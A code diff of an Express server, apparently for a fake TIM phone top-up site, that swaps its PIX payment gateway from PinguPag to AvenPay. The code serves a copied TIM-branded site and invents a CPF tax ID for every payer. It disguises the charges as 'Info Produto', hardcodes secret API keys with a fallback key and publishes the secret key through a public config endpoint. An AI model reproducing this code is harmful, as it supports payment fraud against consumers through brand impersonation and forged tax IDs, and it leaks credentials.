@@ -14,10 +14,52 @@ app.use(express.json());
 // Serve static files from the tim-credito.vercel.app directory
 app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));
 
-const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY || 'pingupag_sk_e0613630214c3ddff5079ba2eedfbfff7125f4c42a3377e5428853fc5e563f4d';
-const PINGUPAG_BASE_URL = process.env.PINGUPAG_BASE_URL || 'https://pagamento-processador.org.ua';
+const AVEN_API_KEY = process.env.AVEN_API_KEY || '3BhRxPFdU2beyFoiX23eweJhc_ILlhs4JSYsNAYCcBk';
+const AVEN_API_KEY_ALT = process.env.AVEN_API_KEY_ALT || '0Z4j53qjhkXy7GKNfySrspNkfVjWzDe01j9SYtd4mxA';
+const AVEN_BASE_URL = process.env.AVEN_BASE_URL || 'https://api.avenpayments.com';
 
-console.log('Gateway configurado: PinguPag');
+async function requestAvenPay(endpoint, method = 'GET', body = null) {
+    const keys = [AVEN_API_KEY, AVEN_API_KEY_ALT].filter(Boolean);
+    let lastError = null;
+
+    for (let i = 0; i < keys.length; i++) {
+        const key = keys[i];
+        try {
+            const options = {
+                method,
+                headers: {
+                    'Authorization': `Bearer ${key}`,
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                }
+            };
+            if (body) {
+                options.body = JSON.stringify(body);
+            }
+
+            const response = await fetch(`${AVEN_BASE_URL}${endpoint}`, options);
+            const text = await response.text();
+            let json = {};
+            try {
+                json = JSON.parse(text);
+            } catch (e) {
+                json = { raw: text };
+            }
+
+            // Se der 401 (token invalido) e houver chave alternativa, tenta a proxima
+            if (response.status === 401 && i < keys.length - 1) {
+                console.warn(`[AVENPAY] Chave ${key.substring(0, 6)}... retornou 401, testando chave alternativa...`);
+                continue;
+            }
+
+            return { ok: response.ok, status: response.status, data: json };
+        } catch (err) {
+            lastError = err;
+        }
+    }
+
+    throw lastError || new Error('Falha ao comunicar com AvenPay');
+}
 
 // Admin credentials
 const ADMIN_USER = 'admin';
@@ -163,7 +205,9 @@ const pixAttempts = new Map();
 // Retorna configurações públicas
 app.get('/api/config', (req, res) => {
     res.json({
-        gateway: 'pingupag'
+        tokenizationKey: AVEN_API_KEY,
+        publicKey: AVEN_API_KEY,
+        gateway: 'avenpay'
     });
 });
 
@@ -171,7 +215,7 @@ app.post('/api/pix', async (req, res) => {
     try {
         const { value, phone } = req.body;
 
-        // amount em centavos
+        // amount em centavos (AvenPay aceita centavos)
         let amount = 2000;
         if (value) {
             const cleanVal = value.toString().replace('R$', '').trim().replace(',', '.');
@@ -182,7 +226,7 @@ app.post('/api/pix', async (req, res) => {
         }
 
         const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
-        const payerPhone = cleanPhone || '11987654321';
+        const payerPhone = cleanPhone ? `+55${cleanPhone}` : '+5511999999999';
 
         let attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };
         attempt.count += 1;
@@ -198,73 +242,67 @@ app.post('/api/pix', async (req, res) => {
         pixAttempts.set(cleanPhone, attempt);
 
         const cleanCpf = generateCPF();
-        const uniqueRef = 'REC-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7);
 
         const payload = {
             amount: amount,
-            description: 'Info Produto',
-            reference: uniqueRef,
-            source: 'api_externa',
-            postback_url: 'https://recargatim.com/api/webhook/pingupag',
-            customer: {
+            currency: 'BRL',
+            method: 'PIX',
+            description: 'Recarga TIM - Info Produto',
+            externalRef: `recarga_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
+            notificationUrl: 'https://recargatim.com/api/webhook/aven',
+            payer: {
                 name: attempt.name,
+                taxId: cleanCpf,
                 email: attempt.email,
-                phone: payerPhone,
-                document: cleanCpf
+                phone: payerPhone
+            },
+            items: [
+                {
+                    name: 'Info Produto',
+                    quantity: 1,
+                    price: amount,
+                    type: 'DIGITAL'
+                }
+            ],
+            metadata: {
+                provider: 'recargatim'
             }
         };
 
-        const response = await fetch(`${PINGUPAG_BASE_URL}/gateway/v1/transaction`, {
-            method: 'POST',
-            headers: {
-                'X-API-Key': PINGUPAG_API_KEY,
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
+        const result = await requestAvenPay('/v1/payment', 'POST', payload);
+        const data = result.data || {};
+        const transactionId = data.id;
+        const copyPaste = data.data?.copypaste || data.copypaste || data.pix?.qr_code || '';
 
-        const textResponse = await response.text();
-        let jsonRes = {};
-        try {
-            jsonRes = JSON.parse(textResponse);
-        } catch (e) {
-            console.error('[PINGUPAG] Resposta não-JSON recebida:', textResponse);
-        }
-
-        const transactionId = jsonRes.transaction_id || jsonRes.id;
-        const copyPaste = jsonRes.qr_code || '';
-
-        if (response.ok && jsonRes.status === 'success' && transactionId && copyPaste) {
+        if ((result.ok || result.status === 201) && transactionId && copyPaste) {
             const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
-            const qrCodeBase64 = jsonRes.qr_code_base64 || '';
 
-            console.log('[PINGUPAG] PIX criado com sucesso:', transactionId);
+            console.log('[AVENPAY] PIX criado com sucesso:', transactionId);
 
             res.json({
                 success: true,
                 data: {
                     id: transactionId,
                     transactionId: transactionId,
-                    status: (jsonRes.payment_status || 'PENDING').toUpperCase(),
+                    status: (data.status || 'PENDING').toUpperCase(),
                     paymentData: {
                         transactionId: transactionId,
                         copyPaste: copyPaste,
                         copypaste: copyPaste,
                         qrCode: copyPaste,
                         qrCodeUrl: qrCodeUrl,
-                        qrCodeBase64: qrCodeBase64
+                        qrCodeBase64: ''
                     },
-                    pingupag: jsonRes
+                    avenpay: data
                 }
             });
         } else {
-            const errMsg = jsonRes?.message || jsonRes?.error || 'Erro ao processar pagamento na PinguPag';
-            console.error('[PINGUPAG] Erro ao criar PIX:', jsonRes);
-            res.status(response.status || 400).json({
+            const errMsg = data?.message || data?.error || 'Erro ao processar pagamento na AvenPay';
+            console.error('[AVENPAY] Erro ao criar PIX:', data);
+            res.status(result.status || 400).json({
                 success: false,
                 message: errMsg,
-                details: jsonRes
+                details: data
             });
         }
     } catch (error) {
@@ -279,32 +317,24 @@ app.get('/api/status/:transactionId', async (req, res) => {
         const { transactionId } = req.params;
         const { phone } = req.query;
 
-        const response = await fetch(`${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`, {
-            headers: {
-                'X-API-Key': PINGUPAG_API_KEY,
-                'Accept': 'application/json'
-            }
-        });
-        const text = await response.text();
-        let jsonRes = {};
-        try { jsonRes = JSON.parse(text); } catch(e) {}
-
-        const rawStatus = (jsonRes.status || 'pending').toUpperCase();
+        const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
+        const data = result.data || {};
+        const rawStatus = (data.status || 'PENDING').toUpperCase();
         let currentStatus = 'PENDING';
-        if (rawStatus === 'APPROVED' || rawStatus === 'PAID') {
-            currentStatus = 'APPROVED';
-        } else if (['REFUNDED', 'FAILED', 'CHARGEBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) {
+        if (rawStatus === 'PAID') {
+            currentStatus = 'PAID';
+        } else if (['REFUNDED', 'REFUSED', 'MED', 'CHARGEDBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) {
             currentStatus = rawStatus;
         }
 
-        if ((currentStatus === 'APPROVED' || currentStatus === 'PAID') && phone) {
+        if (currentStatus === 'PAID' && phone) {
             const cleanPhone = phone.replace(/\D/g, '');
             pixAttempts.delete(cleanPhone);
         }
 
         res.json({
-            success: response.ok,
-            data: { status: currentStatus, rawStatus: jsonRes.status, id: jsonRes.id || transactionId, ...jsonRes }
+            success: result.ok,
+            data: { status: currentStatus, rawStatus: data.status, id: data.id || transactionId, ...data }
         });
     } catch (error) {
         console.error('Error checking status:', error);
@@ -316,29 +346,25 @@ app.get('/api/check_status', async (req, res) => {
     try {
         const transactionId = req.query.id;
         if (!transactionId) return res.status(400).json({ success: false, message: 'Missing transaction id' });
-        const response = await fetch(`${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`, {
-            headers: {
-                'X-API-Key': PINGUPAG_API_KEY,
-                'Accept': 'application/json'
-            }
-        });
-        const json = await response.json();
-        const rawStatus = (json.status || '').toUpperCase();
-        const isPaid = rawStatus === 'APPROVED' || rawStatus === 'PAID';
-        res.json({ status: isPaid ? 'approved' : rawStatus.toLowerCase() || 'pending', data: json });
+        const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
+        const data = result.data || {};
+        const rawStatus = (data.status || '').toUpperCase();
+        const isPaid = rawStatus === 'PAID';
+        res.json({ status: isPaid ? 'approved' : rawStatus.toLowerCase() || 'pending', data: data });
     } catch (error) {
         console.error('Error checking status:', error);
         res.status(500).json({ success: false, message: 'Error checking status' });
     }
 });
 
-// Webhook para notificações PinguPag e retrocompatibilidade
-app.post(['/api/webhook/pingupag', '/api/webhook/freepay', '/api/webhook/droppay', '/api/webhook/aven', '/api/webhook/gateway'], (req, res) => {
+// Webhook para notificações AvenPay e retrocompatibilidade
+app.post(['/api/webhook/aven', '/api/webhook/avenpay', '/api/webhook/freepay', '/api/webhook/droppay', '/api/webhook/pingupag', '/api/webhook/gateway'], (req, res) => {
     const body = req.body;
-    console.log('[PINGUPAG WEBHOOK]', body?.transaction_id || body?.id, body?.status);
-    const status = (body?.status || body?.raw_status || '').toUpperCase();
-    if ((status === 'APPROVED' || status === 'PAID') && body?.customer?.phone) {
-        const cleanPhone = body.customer.phone.replace(/\D/g, '');
+    console.log('[AVENPAY WEBHOOK]', body?.id || body?.Id, body?.status || body?.Status);
+    const status = (body?.status || body?.Status || '').toUpperCase();
+    const payerPhone = body?.payer?.phone || body?.customer?.phone;
+    if (status === 'PAID' && payerPhone) {
+        const cleanPhone = payerPhone.replace(/\D/g, '');
         pixAttempts.delete(cleanPhone);
     }
     res.status(200).json({ received: true });
@@ -498,7 +524,7 @@ if (!isVercel) {
     const PORT = process.env.PORT || 3000;
     app.listen(PORT, () => {
         console.log(`Servidor rodando na porta ${PORT}`);
-        console.log(`Gateway configurado: PinguPag`);
+        console.log(`Gateway configurado: AvenPay`);
         console.log(`Acesse: http://localhost:${PORT}`);
         console.log(`Admin:  http://localhost:${PORT}/admin`);
     });
